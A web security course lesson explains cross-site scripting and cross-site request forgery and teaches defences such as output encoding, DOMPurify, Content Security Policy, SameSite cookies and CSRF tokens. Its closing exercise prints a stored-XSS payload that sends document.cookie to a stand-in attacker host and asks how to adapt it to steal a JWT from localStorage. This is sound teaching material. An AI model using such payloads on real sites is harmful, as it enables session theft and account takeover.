---
title: "Day 9: Web Security (Part 2) - Cross-Site Scripting (XSS) & Cross-Site Request Forgery (CSRF)"
description: "Master two of the most dangerous client-side vulnerabilities: Cross-Site Scripting and Cross-Site Request Forgery. Learn robust defenses utilizing HttpOnly SameSite Cookies, DOMPurify, Content Security Policy (CSP), and CSRF Tokens."
---

# Day 9: Web Security (Part 2) - Cross-Site Scripting (XSS) & CSRF

Yesterday, we learned how to shield databases on the Backend from SQL Injection. Today, we shift our focus to the **Client-side (the user's web browser)** to investigate two highly destructive vulnerabilities that target end users directly: **Cross-Site Scripting (XSS)** and **Cross-Site Request Forgery (CSRF)**.

These two vulnerabilities allow attackers to hijack user accounts, execute unauthorized monetary transactions, or turn your application into a vector for distributing malware.

---

## 1. Understanding Cross-Site Scripting (XSS)

**XSS (Cross-Site Scripting)** occurs when a web application accepts malicious inputs from a user and renders them directly onto a web page without applying proper sanitization or output escaping (Escaping/Sanitization). The victim's browser, upon rendering the page, mistakes this malicious payload for legitimate JavaScript code native to the site and automatically executes it.

```text
XSS Attack Vector targeting Session Cookie Theft:

[ Hacker ] ──(1) Submits malicious <script> ──> [ Web Server (Vulnerable to XSS) ]
                                                     │
                                            (2) Persists/Displays payload
                                                     │
                                                     ▼
[ Victim ] <──(3) Browser executes script ────── [ Web Page ]
      │
   (4) Automatic exfiltration of sensitive Cookie
      │
      ▼
[ Hacker's Server ] (Successfully hijacked user account!)
```

### Three Primary Classifications of XSS:

1.  **Stored XSS (Persistent XSS):** The most critical form of XSS. The malicious JavaScript payload is sent to the server and stored permanently in the database (e.g., inside a blog post, comment field, or user profile description). Every time a user visits the affected page, their browser pulls the payload from the database and executes it.
2.  **Reflected XSS (Non-Persistent XSS):** The malicious script is embedded within the request URL parameters (e.g., search queries like `?q=<script>...`). When a victim clicks this link, the server processes the request, embeds the query parameter into the response page, and sends it back to the victim's browser to execute immediately.
3.  **DOM-based XSS:** This vulnerability occurs entirely on the client-side without data being processed by the server. Client-side JavaScript handles input from an untrusted source (like `location.hash` or `document.referrer`) and writes it directly into the Document Object Model (DOM) using unsafe functions such as `element.innerHTML` or `eval()`.

### What can an attacker achieve by executing JavaScript in a victim's browser?
*   Exfiltrate and steal **Session Cookies** or **Local Storage** containing authentication tokens, transmitting them back to the attacker's server.
*   Manipulate the webpage DOM (e.g., rendering fake login forms to harvest credentials).
*   Impersonate the victim to perform actions like sending messages, posting content, or silently changing passwords.

---

## 2. Defensive Strategies Against XSS

To defend against XSS, you must adopt a defense-in-depth approach:

### Strategy A: Output Encoding
Before rendering any dynamic, user-supplied data into the HTML structure, convert special HTML characters into secure HTML Entities:

```text
Raw Character   ──>   Secure HTML Entity
      <         ──>         &lt;
      >         ──>         &gt;
      &         ──>         &amp;
      "         ──>         &quot;
      '         ──>         &#x27;
```

For instance, the string `<script>` will be converted to `&lt;script&gt;` and rendered strictly as plaintext, preventing the browser from interpreting it as executable code.
*   *Note:* Modern frontend frameworks like **React (JSX)** and **Vue.js** enforce HTML output encoding by default. However, utilizing bypass methods like React's `dangerouslySetInnerHTML` voids this built-in protection.

### Strategy B: HTML Sanitization
If your application must allow users to input rich HTML format (e.g., rich-text editors for blog platforms), you must deploy professional sanitization libraries like **DOMPurify** on both the Client and Backend. This filters out dangerous tags (`<script>`, `<iframe>`) and event-driven properties (`onload`, `onerror`, `onclick`).

```javascript
import DOMPurify from 'dompurify';

// Sanitize untrusted content before injecting it into the DOM
const safeHTML = DOMPurify.sanitize(userProvidedHTML);
```

### Strategy C: Content Security Policy (CSP)
**CSP** is an HTTP response header that lets server administrators restrict the resources (JavaScript, CSS, images, API endpoints) that the browser is allowed to load and execute for a given page.
*   If an attacker successfully injects a `<script src="http://hacker.com/malware.js">` tag, but your CSP is configured to load scripts only from your origin domain (`default-src 'self'`), the browser will block the execution of the external script!

---

## 3. Understanding Cross-Site Request Forgery (CSRF)

**CSRF (Cross-Site Request Forgery)** is an attack vector that forces a victim's browser to submit an unauthorized HTTP request (which automatically attaches the victim's session cookie) to a destination web application where the victim is already authenticated.

```text
CSRF Attack Scenario:

1. Victim logs into [ Bank.com ] and is issued a Session Cookie.
2. Without logging out, the victim opens a new tab and visits [ Evil.com ] (an attacker-controlled site).
3. [ Evil.com ] executes a background script sending an unauthorized transaction request:
   POST to Bank.com/api/transfer { to: "Hacker", amount: 1000 }
4. The victim's browser automatically attaches the valid Bank.com Cookie to this request.
5. [ Bank.com ] receives the request, validates the cookie, and processes the unauthorized transaction!
```

---

## 4. Defensive Strategies Against CSRF

### Strategy 1: Configure SameSite Cookie Attributes (Best Practice)
Most modern browsers enforce the `SameSite` cookie attribute. This attribute controls whether cookies are sent with cross-site requests, providing robust protection against CSRF.

Configure your session and authentication cookies with the following security flags:
*   `HttpOnly`: Restricts JavaScript access to the cookie (mitigating session cookie theft via XSS).
*   `Secure`: Ensures the cookie is only transmitted over encrypted HTTPS connections.
*   `SameSite=Lax` or `SameSite=Strict`: Instructs the browser not to send cookies along with cross-site requests, neutralizing CSRF vectors entirely!

```javascript
// Configuring secure session cookies in Express
res.cookie('session_token', token, {
    httpOnly: true,     // Protects against XSS cookie theft
    secure: true,       // Enforces HTTPS-only transmission
    sameSite: 'strict', // Neutralizes CSRF vectors
    maxAge: 3600000     // 1 hour
});
```

### Strategy 2: Implement CSRF Tokens
For legacy systems or state-changing API endpoints, developers generate a random, unique, and unpredictable cryptographically secure value called a **CSRF Token** when the user loads a form. This token is stored on the server and embedded in the client form. When submitting POST/PUT requests, the client must include this token in the body or HTTP headers.
*   Because malicious external sites cannot read your page contents (due to browser Same-Origin Policy protections), the attacker cannot read or guess the CSRF Token, causing the server to reject the forged request!

---

## 📝 Hands-on Assignment: Analyze the Payload

Below is a malicious payload found inside a comment field on a social media application suffering from Stored XSS:

```html
<img src="does-not-exist.jpg" onerror="fetch('https://attacker-collect.com/log?cookie=' + encodeURIComponent(document.cookie))">
```

### Requirements:
1.  Analyze each component of the payload: What is its execution mechanism? Why did the attacker employ an `<img>` tag combined with an `onerror` handler instead of a classic `<script>` tag?
2.  If our system stores JWT Authentication Tokens in `localStorage` rather than HTTP cookies, how could the attacker modify the payload to extract the JWT?
3.  Propose 2 concrete technical measures you would implement in your project to completely neutralize this destructive payload.
